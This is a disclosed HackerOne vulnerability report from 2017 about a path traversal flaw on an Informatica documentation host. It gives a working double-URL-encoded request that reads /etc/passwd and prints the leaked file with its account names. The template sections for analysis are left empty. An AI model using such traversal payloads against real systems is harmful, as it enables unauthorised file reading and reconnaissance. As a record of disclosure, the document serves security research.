---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '232371'
original_report_id: '232371'
title: '[doc.rt.informaticacloud.com] Arbitrary File Reading via Double URL Encode'
weakness: Path Traversal
team_handle: informatica
created_at: '2017-05-27T06:27:27.274Z'
disclosed_at: '2022-07-23T11:03:13.203Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 17
tags:
- hackerone
- path-traversal
---

# [doc.rt.informaticacloud.com] Arbitrary File Reading via Double URL Encode

## Metadata

- HackerOne Report ID: 232371
- Weakness: Path Traversal
- Program: informatica
- Disclosed At: 2022-07-23T11:03:13.203Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi. Attacker can read arbitrary file in system via next query:

```
http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/topic/com.activee.bpep.doc/images/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
```

You can see the response here: 
{F188500}

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
landscape:x:103:108::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
puppet:x:105:111:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
vrangan:x:1001:1001::/home/vrangan:/bin/bash
avahi:x:106:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
